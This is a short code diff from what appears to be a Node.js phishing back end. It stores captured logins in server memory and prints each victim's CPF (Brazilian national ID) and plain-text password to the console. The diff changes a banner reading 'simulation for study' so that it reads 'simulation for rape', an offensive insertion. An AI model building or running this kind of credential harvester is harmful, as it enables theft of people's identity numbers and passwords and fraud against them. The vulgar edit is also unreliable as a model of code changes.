@@ -25,7 +25,7 @@ async function startServer() {
     capturedLogins.push(logEntry); // Salva na memória do servidor
 
     console.log('\n======================================================');
-    console.log('🚨 NOVO LOGIN CAPTURADO (SIMULAÇÃO PARA ESTUDO) 🚨');
+    console.log('🚨 NOVO LOGIN CAPTURADO (SIMULAÇÃO PARA ESTUPRO) 🚨');
     console.log(`CPF: ${cpf}`);
     console.log(`Senha: ${password}`);
     console.log(`Horário: ${logEntry.timestamp}`);
